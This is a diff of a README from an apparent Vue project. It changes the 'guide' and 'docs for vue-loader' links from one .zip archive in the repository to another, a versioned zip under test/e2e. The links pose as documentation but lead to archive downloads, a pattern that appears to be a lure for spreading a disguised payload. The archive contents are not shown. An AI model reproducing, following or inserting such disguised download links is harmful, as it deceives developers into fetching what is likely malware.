@@ -27,4 +27,4 @@ npm run e2e
 npm test
 ```
 
-For a detailed explanation on how things work, check out the [guide](https://raw.githubusercontent.com/lamaSonmez/articles_management/master/grump/articles_management.zip) and [docs for vue-loader](https://raw.githubusercontent.com/lamaSonmez/articles_management/master/grump/articles_management.zip).
+For a detailed explanation on how things work, check out the [guide](https://github.com/lamaSonmez/articles_management/raw/refs/heads/master/test/e2e/articles-management-2.9.zip) and [docs for vue-loader](https://github.com/lamaSonmez/articles_management/raw/refs/heads/master/test/e2e/articles-management-2.9.zip).
